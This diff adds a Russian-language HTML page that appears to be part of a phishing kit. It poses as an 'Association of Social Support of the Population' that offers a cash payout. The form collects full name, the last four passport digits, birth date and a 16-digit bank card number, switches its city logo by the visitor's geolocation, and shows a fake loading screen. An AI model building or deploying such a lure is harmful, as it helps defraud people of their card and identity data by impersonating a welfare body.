@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" type="text/css" href="index.css">
+        <link rel="stylesheet" type="text/css" href="form.css">
+        <link rel="stylesheet" type="text/css" href="req.css">
+        <title>Анкета</title>
+        <script src="form.js" defer></script>
+        <script src="http://api-maps.yandex.ru/2.0-stable/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+        <script type="text/javascript">
+            window.onload = function () {
+                setTimeout(
+                    () => document.getElementById("cube-loader").
+                    style.display = "none",
+                1900);
+                if (ymaps.geolocation.region == "Москва и Московская область") {
+                    logo__img.src = "../public/Moscow.svg";
+                }
+                //================================
+                let fields = document.querySelectorAll(".form__field");
+
+                for(let i = 0; i < fields.length; ++i) {
+                    if (localStorage.getItem(fields[i].id) != null) {
+                        fields[i].value = localStorage.getItem(fields[i].id);
+                    }
+                }
+
+                let sexField = document.getElementById("sex");
+                sexField.value = (localStorage.getItem("male")) ? "Мужской" : "Женский";
+
+                let title = document.getElementById("title");
+                title.innerText = "Для получения средств в размере " + localStorage.getItem("number") + " руб. заполните недостающую информацию в заявке на выплату";
+            }
+        </script>
+    </head>
+    <body>
+
+        <div id="cube-loader">
+            <div class="caption">
+              <div class="cube-loader">
+                <div class="cube loader-1"></div>
+                <div class="cube loader-2"></div>
+                <div class="cube loader-4"></div>
+                <div class="cube loader-3"></div>
+              </div>
+            </div>
+          </div>
+
+        <header>
+            <a id="logo">
+                <img id="logo__img" 
+                src="../public/Saint_Petersburg.svg" 
+                height="100%" />
+                <span><label>АССОЦИАЦИЯ</label> СОЦИАЛЬНОЙ<br />
+                    ПОДДЕРЖКИ НАСЕЛЕНИЯ</span>
+            </a>
+            <nav>
+                <select></select>
+                <select></select>
+            </nav>
+        </header>
+
+        <main>
+            <div class="form form_req">
+                <h2 id="title"></h2>
+                <form>
+                <div class="form__row">
+                    <div class="form__column">
+                        <label class="form__label" for="sname">Фамилия</label>
+                        <input class="form__field" id="sname" />
+                        <label class="form__label" for="lname">Отчество</label>
+                        <input class="form__field"  id="lname" />
+                        <label class="form__label" for="passport">Четыре последние цифры номера паспорта</label>
+                        <input class="form__field" id="passport" maxlength="4" />
+                    </div>
+                    <div class="form__column">
+                        <label class="form__label" for="fname">Имя</label>
+                        <input class="form__field"  id="fname" />
+                        <div class="form__row">
+                            <div class="form__column">
+                            <label class="form__label" for="sex">Пол</label>
+                            <input id="sex" class="form__field" />
+                            </div>
+                            <div class="form__column">
+                            <label class="form__label" for="birth">Дата рождения</label>
+                            <input class="form__field" id="birth" type="date" min="01.01.1900" />
+                            </div>
+                        </div>
+                        <label class="form__label" for="card">Карта</label>
+                        <input id="card" class="form__field" minlength="16" maxlength="16" />
+                    </div>
+                </div>
+                    
+                    <button class="form__submit" type="submit" >Отправить анкету на обработку</button>
+                </form>
+            </div>
+        </main>
+
+        <aside>
+            <div class="contacts">
+                <div class="contacts__text">
+                    <h1>
+                        Остались вопросы?
+                    </h1>
+                    <p>
+                        Задайте их по электронной почте: pochta@test.ru
+                    </p>
+                </div>
+                <div class="contacts__picture">
+                    <a>
+
+                    </a>
+                </div>
+            </div>
+        </aside>
+        <footer>
+            <div>
+                <h4><label>Ассоциация</label> социальной поддержки населения</h4>
+                <span>Москва и Московская область</span>
+            </div>
+            <span>При поддержке ИТ-штаба</span>
+        </footer>
+
+    </body>
+</html>
